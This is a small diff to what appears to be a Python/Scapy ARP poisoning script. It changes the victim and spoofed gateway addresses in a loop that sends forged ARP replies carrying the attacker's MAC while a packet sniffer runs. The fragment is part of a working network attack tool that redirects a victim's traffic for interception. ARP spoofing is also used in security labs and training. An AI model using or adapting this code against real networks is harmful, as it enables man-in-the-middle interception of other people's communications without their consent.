@@ -43,7 +43,7 @@ def main() -> None:
         sniff.start()
         print('[>] Starting poisoning')
         while not stop_flag.is_set():
-            send(ARP(op=1, pdst='192.168.3.5', psrc='192.168.3.250', hwsrc=MAC), verbose=True)
+            send(ARP(op=1, pdst='192.168.242.5', psrc='192.168.242.250', hwsrc=MAC), verbose=True)
             time.sleep(1)
     except KeyboardInterrupt:
         print('\n[>] Got keyboard interrupt')
